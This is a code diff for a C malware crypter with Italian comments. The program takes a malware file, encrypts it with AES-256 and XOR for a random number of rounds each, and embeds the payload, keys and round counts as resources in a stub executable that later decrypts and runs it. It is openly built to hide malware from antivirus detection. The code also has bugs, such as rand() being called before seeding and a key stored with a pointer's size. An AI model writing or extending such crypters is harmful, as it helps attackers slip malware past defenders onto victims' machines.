@@ -79,6 +79,31 @@ int AESDecrypt(unsigned char * payload, unsigned int payload_len, char * key, si
 }
 
 
+void ROT_encrypt(unsigned char* str, size_t data_len, int rot){
+    for(int i = 0; i < data_len; i++){
+        str[i] = str[i] + rot;
+    }
+}
+void ROT_decrypt(unsigned char* str, size_t data_len, int rot){
+    for(int i = 0; i < data_len; i++){
+        str[i] = str[i] - rot;
+    }
+}
+
+
+void XOR(unsigned char * data, size_t data_len, char * key, size_t key_len) {
+	int j;
+	
+	j = 0;
+	for (int i = 0; i < data_len; i++) {
+		if (j == key_len - 1) j = 0;
+
+		data[i] = data[i] ^ key[j];
+		j++;
+	}
+}
+
+
 int main(int argc, char* argv[]){
     char * malwarePath = argv[1];
 
@@ -87,15 +112,22 @@ int main(int argc, char* argv[]){
     long malwareLen;
     long stubLen;
 
-    unsigned char key[32];
+    unsigned char AESkey[32];
+    unsigned char XORkey[32];
+    int tmp = 1 + rand() % 37;
+
+    int* ROTkey = &tmp;
     srand((unsigned int)time(NULL));
 
-   /*
-  for(int i = 0; i< 32; i++){
-        key[i] = (unsigned char) (rand() % 256);
-        printf("chiave: %x\n", key[i]);
+    //genero casualmente la chiave AES di 32 byte
+    for(int i = 0; i< 32; i++){
+        AESkey[i] = (unsigned char) (rand() % 256);
+        printf("chiave: %x\n", AESkey[i]);
     }
-   */ 
+    for(int i = 0; i< 32; i++){
+        XORkey[i] = (unsigned char) (rand() % 256);
+        printf("chiave: %x\n", XORkey[i]);
+    }
 
 
     //////////////////////////////
@@ -122,16 +154,33 @@ int main(int argc, char* argv[]){
 
     //////////////////////////////
     //copio i raw bytes dei file malwere e stub in due array di unsigned char
-    
-    AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware
+    for(int i = 0; i < 2000; i++){
+        printf("%c",malware[i]);
+    }
+    printf("\n\n\n\n");
+
+    int nAES = 1 + rand() % 20;
+    int nXOR = 1 + rand() % 20;
+    for(int i = 0; i< nAES; i++){
+        AESEncrypt(malware, malwareLen, (char *)AESkey, sizeof(AESkey)); //cripto in AES-256 il malware
+    }
+    for(int i = 0; i< nXOR; i++){
+        XOR(malware, malwareLen, (char *)XORkey, sizeof(XORkey)); //cripto in AES-256 il malware
+    }
+    //ROT_encrypt(malware, malwareLen, *ROTkey);
+
 
 
     //adesso dovremo aprire il file 'stub.exe' e aggiungere nella sua sezione resources (la .rsrc) il malware criptato
 
     HANDLE hUpdateRes;
     BOOL result;
-    BOOL resultKey;
+    BOOL resultAESKey;
+    BOOL resultXORKey;
+    BOOL resultROTKey;
 	
+    BOOL nAESresult;
+    BOOL nXORresult;    
 
     hUpdateRes = BeginUpdateResource("mio_stub.exe", FALSE);
     if (hUpdateRes == NULL)
@@ -143,17 +192,32 @@ int main(int argc, char* argv[]){
     //69 e' molto importante perche' e' l'ID della risorsa che andremo a creare, quindi nello stub dovremo usare lo stesso id_risorsa
     //(potevo dargli qualsiasi valore ma 69 e' figo), BIN e' il tipo di risorsa (ovvero raw bytes)
     result = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(69), NULL, malware, malwareLen);
-    resultKey = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(420), NULL, key, sizeof(key));
+    //mi passo la mia chiave generata casualmente tramite la sezione resources
+    resultAESKey = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(420), NULL, AESkey, sizeof(AESkey));
+    resultXORKey = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(421), NULL, XORkey, sizeof(XORkey));
+    resultROTKey = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(422), NULL, ROTkey, sizeof(ROTkey));
+
+    nAESresult = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(123), NULL, &nAES, sizeof(nAES));
+    nXORresult = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(124), NULL, &nXOR, sizeof(nXOR));
+
 
     if(result == FALSE){
         printf("impossibile aggiungere il malware allo stub");
         return 0;
     }
-    if(resultKey == FALSE){
-        printf("impossibile aggiungere la chiave allo stub");
+    if(resultAESKey == FALSE){
+        printf("impossibile aggiungere la chiave AES allo stub");
         return 0;
     }
-    
+    if(resultXORKey == FALSE){
+        printf("impossibile aggiungere la chiave XOR allo stub");
+        return 0;
+    }    
+    if(resultROTKey == FALSE){
+        printf("impossibile aggiungere la chiave ROT allo stub");
+        return 0;
+    }
+
     if (!EndUpdateResource(hUpdateRes, FALSE)){
         printf("impossibile salvare le modifiche");
         return 0;
